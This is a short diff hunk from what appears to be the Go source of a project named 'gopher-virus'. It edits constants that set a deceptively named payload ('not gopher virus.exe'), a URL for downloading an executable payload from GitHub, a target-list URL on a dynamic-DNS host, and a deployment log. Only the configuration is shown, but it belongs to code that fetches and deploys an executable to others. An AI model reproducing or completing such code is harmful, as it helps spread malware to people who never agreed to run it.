@@ -14,8 +14,8 @@ import (
 
 const (
 	payloadname = "not gopher virus.exe"
-	payloadURL = "https://raw.githubusercontent.com/itsyourboychipsahoy/gopher-virus/master/payload.exe"
-	listURL     = "gopher.ddns.net/peep/gopherlist.txt"
+	payloadURL  = "https://raw.githubusercontent.com/itsyourboychipsahoy/gopher-virus/master/payload.exe"
+	listURL     = "https://gopher.ddns.net/peep/gopherlist.txt"
 	logfile     = "deploy_gophers.log"
 )
 
